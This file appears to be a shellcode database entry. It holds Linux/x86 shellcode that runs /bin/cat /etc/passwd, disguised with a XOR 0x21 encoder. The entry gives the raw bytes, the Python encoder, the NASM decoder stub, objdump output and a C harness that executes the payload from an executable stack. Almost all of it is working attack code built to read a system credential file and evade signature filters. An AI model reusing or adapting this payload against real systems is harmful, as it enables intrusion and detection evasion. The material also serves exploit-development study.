/*
# Title : Linux/x86 - execve /bin/cat /etc/passwd XOR encoded shellcode (62 bytes)
# Author: Goutham Madhwaraj
# Date : 24/10/2018
# Tested on: i686 GNU/Linux
# Shellcode Length: 62
# to run : gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
           ./shellcode

original shellcode without encoding :

"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x50\x51\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"


 disassembly of text section for unencoded shellcode :

Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	50                   	push   eax
 8048083:	68 2f 63 61 74       	push   0x7461632f
 8048088:	68 2f 62 69 6e       	push   0x6e69622f
 804808d:	89 e3                	mov    ebx,esp
 804808f:	50                   	push   eax
 8048090:	68 73 73 77 64       	push   0x64777373
 8048095:	68 2f 2f 70 61       	push   0x61702f2f
 804809a:	68 2f 65 74 63       	push   0x6374652f
 804809f:	89 e1                	mov    ecx,esp
 80480a1:	50                   	push   eax
 80480a2:	51                   	push   ecx
 80480a3:	53                   	push   ebx
 80480a4:	89 e1                	mov    ecx,esp
 80480a6:	50                   	push   eax
 80480a7:	89 e2                	mov    edx,esp
 80480a9:	b0 0b                	mov    al,0xb
 80480ab:	cd 80                	int    0x80

 encoded using XOR technique used 0x21 to XOR the shellcode. 
XoREncoder.py :
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#!/usr/bin/python
shellcode = ("\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x50\x51\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80")
encoded = ""
print 'Encoded shellcode :'
for x in bytearray(shellcode) :
	# XOR Encoding 	
	y = x^0x21
	encoded += '0x'
	encoded += '%02x,' %y
print encoded
print 'Len: %d' % len(bytearray(shellcode))

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
./XOREncoder.py
Encoded shellcode :
0x10,0xe1,0x71,0x49,0x0e,0x42,0x40,0x55,0x49,0x0e,0x43,0x48,0x4f,0xa8,0xc2,0x71,0x49,0x52,0x52,0x56,0x45,0x49,0x0e,0x0e,0x51,0x40,0x49,0x0e,0x44,0x55,0x42,0xa8,0xc0,0x71,0x70,0x72,0xa8,0xc0,0x71,0xa8,0xc3,0x91,0x2a,0xec,0xa1,
Len: 45


> next we pass the encoded shellcode to decoder.nasm and fetch the final encoded shellcode

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

global _start			
section .text
_start:

	jmp short call_decoder

decoder:
	pop esi

decode:
	xor byte [esi], 0x21
	jz Shellcode
	inc esi
	jmp short decode

call_decoder:

	call decoder
	Shellcode: db 0x10,0xe1,0x71,0x49,0x0e,0x42,0x40,0x55,0x49,0x0e,0x43,0x48,0x4f,0xa8,0xc2,0x71,0x49,0x52,0x52,0x56,0x45,0x49,0x0e,0x0e,0x51,0x40,0x49,0x0e,0x44,0x55,0x42,0xa8,0xc0,0x71,0x70,0x72,0xa8,0xc0,0x71,0xa8,0xc3,0x91,0x2a,0xec,0xa1,0x21

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


$ objdump -d ./decoder -M intel

./decoder:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	eb 09                	jmp    804808b <call_decoder>

08048082 <decoder>:
 8048082:	5e                   	pop    esi

08048083 <decode>:
 8048083:	80 36 21             	xor    BYTE PTR [esi],0x21
 8048086:	74 08                	je     8048090 <Shellcode>
 8048088:	46                   	inc    esi
 8048089:	eb f8                	jmp    8048083 <decode>

0804808b <call_decoder>:
 804808b:	e8 f2 ff ff ff       	call   8048082 <decoder>

08048090 <Shellcode>:
 8048090:	10 e1                	adc    cl,ah
 8048092:	71 49                	jno    80480dd <Shellcode+0x4d>
 8048094:	0e                   	push   cs
 8048095:	42                   	inc    edx
 8048096:	40                   	inc    eax
 8048097:	55                   	push   ebp
 8048098:	49                   	dec    ecx
 8048099:	0e                   	push   cs
 804809a:	43                   	inc    ebx
 804809b:	48                   	dec    eax
 804809c:	4f                   	dec    edi
 804809d:	a8 c2                	test   al,0xc2
 804809f:	71 49                	jno    80480ea <Shellcode+0x5a>
 80480a1:	52                   	push   edx
 80480a2:	52                   	push   edx
 80480a3:	56                   	push   esi
 80480a4:	45                   	inc    ebp
 80480a5:	49                   	dec    ecx
 80480a6:	0e                   	push   cs
 80480a7:	0e                   	push   cs
 80480a8:	51                   	push   ecx
 80480a9:	40                   	inc    eax
 80480aa:	49                   	dec    ecx
 80480ab:	0e                   	push   cs
 80480ac:	44                   	inc    esp
 80480ad:	55                   	push   ebp
 80480ae:	42                   	inc    edx
 80480af:	a8 c0                	test   al,0xc0
 80480b1:	71 70                	jno    8048123 <Shellcode+0x93>
 80480b3:	72 a8                	jb     804805d <_start-0x23>
 80480b5:	c0                   	(bad)  
 80480b6:	71 a8                	jno    8048060 <_start-0x20>
 80480b8:	c3                   	ret    
 80480b9:	91                   	xchg   ecx,eax
 80480ba:	2a ec                	sub    ch,ah
 80480bc:	a1                   	.byte 0xa1
 80480bd:	21                   	.byte 0x21

*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x09\x5e\x80\x36\x21\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x10\xe1\x71\x49\x0e\x42\x40\x55\x49\x0e\x43\x48\x4f\xa8\xc2\x71\x49\x52\x52\x56\x45\x49\x0e\x0e\x51\x40\x49\x0e\x44\x55\x42\xa8\xc0\x71\x70\x72\xa8\xc0\x71\xa8\xc3\x91\x2a\xec\xa1\x21";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}